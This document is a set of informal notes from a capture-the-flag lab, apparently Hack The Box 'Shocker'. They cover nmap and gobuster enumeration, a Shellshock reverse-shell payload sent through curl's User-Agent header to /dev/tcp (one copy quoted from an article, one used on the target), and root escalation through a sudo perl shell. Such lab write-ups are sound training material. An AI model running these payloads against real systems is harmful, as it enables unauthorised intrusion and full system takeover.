@@ -1,0 +1,189 @@
+kali@kali:~$ nmap -sC -sV 10.10.10.56
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 13:36 EDT
+Nmap scan report for 10.10.10.56
+Host is up (0.16s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.56 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.56
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/05 13:48:48 Starting gobuster
+===============================================================
+/server-status (Status: 403)
+===============================================================
+2020/07/05 14:09:46 Finished
+
+
+
+now we can add -f to add slash 
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.56 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -f
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.56
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Add Slash:      true
+[+] Timeout:        10s
+===============================================================
+2020/07/05 14:10:43 Starting gobuster
+===============================================================
+/cgi-bin/ (Status: 403)
+/icons/ (Status: 403)
+Progress: 49977 / 220561 (22.66%)^C
+
+based on the name this is going to be shell shock ?
+
+looking for the cgi scrip or sh script
+
+do the same scan but using /cgi-bin with extention .cgi and .sh
+
+
+
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.56/cgi-bin --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30  -x sh,cgi
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.56/cgi-bin
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     sh,cgi
+[+] Timeout:        10s
+===============================================================
+2020/07/05 14:20:21 Starting gobuster
+===============================================================
+/user.sh (Status: 200)
+Progress: 5313 / 220561 (2.41%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2020/07/05 14:21:46 Finished
+===============================================================
+
+
+we find /user.sh
+
+https://medium.com/@hackbotone/shellshock-attack-on-a-remote-web-server-d9124f4a0af3
+
+there's revers shellshock from curl directly 
+
+curl -A “() { :; }; /bin/bash -i > /dev/tcp/192.168.2.13/9000 0<&1 2>&1” http://192.168.2.18/cgi-bin/helloworld.cgi
+
+
+we can do the same for our case
+
+1. listen on port 8080
+
+kali@kali:~$ nc -nlvp 8080
+listening on [any] 8080 ...
+
+2. verify we actually listen on it
+
+
+kali@kali:~/go/bin$ sudo netstat -ntpl
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      3307/nc  
+
+
+make sure we listen on any ip, otherwse it won't work for the openvpn
+
+
+now make the call
+
+kali@kali:~$ curl -k -v -A "() { :; }; /bin/bash -i > /dev/tcp/x.x.x.x/8080 0<&1 2>&1" http://10.10.10.56/cgi-bin/user.sh
+*   Trying 10.10.10.56:80...
+* TCP_NODELAY set
+* Connected to 10.10.10.56 (10.10.10.56) port 80 (#0)
+> GET /cgi-bin/user.sh HTTP/1.1
+> Host: 10.10.10.56
+> User-Agent: () { :; }; /bin/bash -i > /dev/tcp/10.10.14.5/8080 0<&1 2>&1
+> Accept: */*
+> 
+
+
+
+now we have the user
+
+helly@Shocker:/usr/lib/cgi-bin$ 
+
+
+shelly@Shocker:/usr/lib/cgi-bin$ l
+shelly@Shocker:/usr/lib/cgi-bin$ s -al
+
+check if we have root on any command
+
+shelly@Shocker:/home/shelly$ sudo -l
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+
+
+great, it's perl, which is definitely a human language
+
+
+shelly@Shocker:/home/shelly$ /usr/bin/perl -e 'exec "/bin/sh"'
+/usr/bin/perl -e 'exec "/bin/sh"'
+
+ls -al
+total 36
+drwxr-xr-x 4 shelly shelly 4096 Sep 22  2017 .
+drwxr-xr-x 3 root   root   4096 Sep 22  2017 ..
+-rw------- 1 root   root      0 Sep 25  2017 .bash_history
+-rw-r--r-- 1 shelly shelly  220 Sep 22  2017 .bash_logout
+-rw-r--r-- 1 shelly shelly 3771 Sep 22  2017 .bashrc
+drwx------ 2 shelly shelly 4096 Sep 22  2017 .cache
+drwxrwxr-x 2 shelly shelly 4096 Sep 22  2017 .nano
+-rw-r--r-- 1 shelly shelly  655 Sep 22  2017 .profile
+-rw-r--r-- 1 root   root     66 Sep 22  2017 .selected_editor
+-rw-r--r-- 1 shelly shelly    0 Sep 22  2017 .sudo_as_admin_successful
+-r--r--r-- 1 root   root     33 Sep 22  2017 user.txt
+pwd
+/home/shelly
+whoami
+shelly
+
+
+forget to use the sudo ...
+
+shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/sh"'
+sudo /usr/bin/perl -e 'exec "/bin/sh"'
+pwd
+/home/shelly
+whoami
+root
+
+
+
+
